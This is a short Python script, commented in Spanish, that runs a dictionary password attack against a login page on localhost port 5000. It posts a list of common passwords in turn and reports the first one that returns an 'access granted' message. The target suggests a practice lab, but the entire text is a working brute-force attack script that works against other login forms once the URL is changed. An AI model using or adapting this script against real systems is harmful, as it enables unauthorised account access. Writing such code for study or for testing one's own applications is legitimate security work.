import requests

# URL de la página de inicio de sesión
url = "http://127.0.0.1:5000/"
# Lista de contraseñas a probar (puedes agregar más)
passwords = ["123456", "password", "123456789", "secreta123", "qwerty", "abc123"]

for password in passwords:
    response = requests.post(url, data={"password": password})
    
    if "¡Acceso concedido!" in response.text:
        print(f"Contraseña encontrada: {password}")
        break
    else:
        print(f"Contraseña incorrecta: {password}")
